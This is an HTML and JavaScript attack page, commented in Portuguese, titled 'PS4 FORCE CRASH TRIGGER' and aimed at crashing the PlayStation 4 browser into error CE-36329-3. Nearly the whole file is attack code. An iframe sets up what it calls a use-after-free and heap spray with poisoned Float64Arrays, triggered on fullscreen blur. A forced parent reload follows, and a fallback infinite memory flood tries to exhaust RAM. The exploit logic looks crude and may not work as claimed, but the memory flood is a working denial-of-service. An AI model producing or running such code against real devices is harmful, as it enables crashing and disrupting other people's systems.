<!DOCTYPE html>
<html>
<head>
    <title>PS4 FORCE CRASH TRIGGER</title>
    <style>
        body { background-color: #000; color: #f00; font-family: sans-serif; text-align: center; }
        iframe { width: 90%; height: 400px; border: 4px solid #fff; background: #222; margin: 20px auto; display: block;}
        button { padding: 20px 40px; font-size: 1.5em; cursor: pointer; background: #f00; color: white; border: 2px solid #fff; font-weight: bold; }
        #log { text-align: left; margin: 20px auto; width: 90%; border: 1px solid #555; padding: 10px; background: #111; color: #0f0; }
    </style>
</head>
<body>

<h1>FORCE CRASH TRIGGER</h1>
<h3>Objetivo: Transformar Soft Lock em Erro CE-36329-3</h3>

<iframe id="trigger_frame" srcdoc="
    <html>
    <body style='background:#300; color:#fff; text-align:center'>
        <h3>ZONA DO GATILHO</h3>
        <button onclick='startSequence()'>INICIAR SEQUÊNCIA DE CRASH</button>
        <div id='status'>Pronto.</div>
        <script>
            var victims = [];
            var spray = [];
            const COUNT = 15000;
            // Usamos um valor NON-CANONICAL proposital (0x4141...)
            // Isso DEVE causar erro de acesso de memória se lido como ponteiro
            const POISON = 2.121995791e-314; 

            function startSequence() {
                // 1. Setup
                document.getElementById('status').innerText = 'Alocando...';
                for(let i=0; i<COUNT; i++) {
                    let v = new Float64Array(16);
                    v.fill(1.1);
                    victims.push(v);
                }
                
                // 2. Fullscreen
                document.getElementById('status').innerText = 'APERTE OPTIONS AGORA!';
                var el = document.documentElement;
                var rfs = el.webkitRequestFullscreen || el.requestFullscreen;
                rfs.call(el);

                window.onblur = function() {
                    // 3. O ATAQUE (UAF)
                    victims = null;
                    
                    // Spray Massivo
                    for(let i=0; i<COUNT*2; i++) {
                        let s = new Float64Array(24);
                        s.fill(POISON);
                        spray.push(s);
                    }

                    // 4. O TIRO DE MISERICÓRDIA
                    // Avisa o pai para recarregar a página inteira AGORA
                    // enquanto a memória está instável.
                    window.parent.postMessage('KILL_ME_NOW', '*');
                };
            }
        </script>
    </body>
    </html>
"></iframe>

<div id="log">Logs do Sistema...</div>

<script>
    const Log = document.getElementById('log');
    function log(txt) { Log.innerHTML += '>> ' + txt + '<br>'; }

    // Escuta o pedido de morte do Iframe
    window.addEventListener('message', function(e) {
        if(e.data === 'KILL_ME_NOW') {
            log("⚠️ SINAL RECEBIDO! FORÇANDO RELOAD GLOBAL...");
            document.body.style.background = "#fff"; // Flash Visual
            
            // Remove o iframe primeiro para causar destruição local
            try { document.getElementById('trigger_frame').remove(); } catch(e){}

            // FORÇA O NAVEGADOR A RECARREGAR A PÁGINA PAI
            // Se houver corrupção de memória, isso vai falhar catastroficamente (Crash)
            setTimeout(function() {
                window.location.reload(true);
            }, 100); // Pequeno delay para garantir que o spray assentou
            
            // Plano B: Se o reload não funcionar (Soft Lock), encher a RAM até morrer
            setTimeout(function() {
                log("Reload falhou? Iniciando Memory Flood...");
                let killer = [];
                while(true) { killer.push(new ArrayBuffer(1024*1024)); }
            }, 2000);
        }
    });
</script>

</body>
</html>
